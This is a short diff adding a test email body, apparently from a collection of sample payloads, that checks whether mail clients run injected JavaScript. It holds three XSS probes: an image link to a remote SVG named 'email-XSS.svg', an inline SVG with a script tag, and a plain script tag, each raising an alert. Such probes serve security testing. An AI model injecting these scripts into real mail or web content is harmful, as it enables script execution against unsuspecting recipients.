@@ -1,0 +1,13 @@
+Hello,
+<br/>This is a test mail containing two javascript functions.
+<br/>IMG-SVG:
+<br/><img src="https://raw.githubusercontent.com/Patrick-DE/SamplePayloads/master/email-XSS.svg"/>
+<br/>SVG:
+<br/><svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+   <script type="text/javascript">
+      alert("SVG-XSS-BLUE");
+   </script>
+</svg>
+<br/>Plain JS
+<br/><script>alert("Email-XSS-SimpleJS")</script><br/>
